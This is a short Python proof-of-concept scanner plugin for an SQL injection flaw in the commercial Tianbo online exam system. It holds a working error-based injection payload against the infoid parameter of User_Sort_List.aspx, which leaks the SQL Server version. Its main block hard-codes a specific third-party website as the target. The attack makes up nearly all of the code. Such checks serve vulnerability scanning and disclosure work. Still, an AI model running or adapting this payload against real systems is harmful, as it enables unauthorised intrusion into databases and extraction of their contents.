#!/usr/bin/env python
# -*- coding: utf-8 -*-

"""
POC Name  : 天柏在线考试系统商业版注入漏洞
Author    :  a
mail      :  a@lcx.cc
"""
def assign(service, arg): 
    if service == "tianbo_train": 
        return True, arg 
def audit(arg):
    payload ='Web/User_Sort_List.aspx?infoid=94%20AND%205472=CONVERT(INT,(char(116)%2Bchar(101)%2Bchar(115)%2Bchar(116)%2Bchar(118)%2Bchar(117)%2Bchar(108)%2B@@version))'
    target = arg + payload
    code, head, res, errcode, _ = curl.curl2(target)
    if  code==500 and 'testvulMicrosoft SQL Server' in res: 
        security_hole(target) 
if __name__ == '__main__': 
    from dummy import *
    audit(assign('tianbo_train','http://www.exam.sinopx.cn/')[1])